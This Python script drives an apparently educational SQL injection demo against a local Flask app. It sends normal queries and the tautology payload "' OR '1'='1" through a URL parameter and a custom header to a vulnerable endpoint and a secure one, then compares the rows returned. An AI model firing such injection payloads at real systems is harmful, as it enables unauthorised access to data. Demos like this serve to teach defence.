import requests
import re

BASE_URL = "http://127.0.0.1:5000"
NORMAL_QUERY = "Electronics"
MALICIOUS_QUERY = "' OR '1'='1"
HEADER_PAYLOAD = "Lifestyle' OR '1'='1"


def extract_row_count(html_text):
    body_match = re.search(r"<tbody>(.*?)</tbody>", html_text, re.DOTALL | re.IGNORECASE)
    if not body_match:
        return 0
    return len(re.findall(r"<tr>", body_match.group(1), re.IGNORECASE))


def run_case(path, query, use_header=False, header_value=""):
    params = {"q": query, "use_header": "1" if use_header else "0"}
    headers = {}
    if use_header:
        headers["X-User-Input"] = header_value

    response = requests.get(f"{BASE_URL}{path}", params=params, headers=headers, timeout=8)
    print(f"\n=== GET {response.url} ===")
    print(f"Status: {response.status_code}")
    # print("Full response body:")
    # print(response.text)
    print("Rows returned:", extract_row_count(response.text))
    print("Header sent:", headers.get("X-User-Input", "<none>"))
    print("Contains SQL error banner:", "SQL Error" in response.text)


if __name__ == "__main__":
    print("HTTP SQL injection demo (local educational use only)")
    print("Start Flask first: python app.py")

    # 1) Normal query against vulnerable endpoint.
    run_case("/search", NORMAL_QUERY)

    # 2) Malicious query parameter against vulnerable endpoint.
    run_case("/search", MALICIOUS_QUERY)

    # 3) Normal query against secure endpoint.
    run_case("/search_secure", NORMAL_QUERY)

    # 4) Same malicious query against secure endpoint.
    run_case("/search_secure", MALICIOUS_QUERY)

    # 5) Optional advanced demo: header payload against vulnerable SQL path.
    run_case("/search", NORMAL_QUERY, use_header=True, header_value=HEADER_PAYLOAD)

    # 6) Optional advanced demo against secure endpoint.
    run_case("/search_secure", NORMAL_QUERY, use_header=True, header_value=HEADER_PAYLOAD)
